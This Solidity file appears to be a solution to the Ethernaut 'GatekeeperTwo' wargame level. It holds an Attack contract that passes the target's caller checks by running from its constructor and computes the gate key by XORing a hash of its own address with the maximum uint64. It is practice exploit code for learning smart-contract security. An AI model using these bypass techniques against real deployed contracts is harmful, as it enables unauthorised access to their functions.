pragma solidity ^0.8;

interface IGateKeeperTwo {
    function entrant() external view returns (address);

    function enter(bytes8) external returns (bool);
}

contract Attack {
    constructor(IGateKeeperTwo target) {
        // GATE ONE
        // any call from contract will bypass

        // GATE TWO
        // any call from contract constructor will bypass

        // GATE THREE
        // a ^ a ^ b = b
        // a ^ a = 0000
        // max = 11...11
        // s ^ key = max
        // s ^ s ^ key = s ^ max
        // key = s ^ max
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = type(uint64).max ^ s;
        bytes8 key = bytes8(k);
        require(target.enter(key), "failed");
    }
}
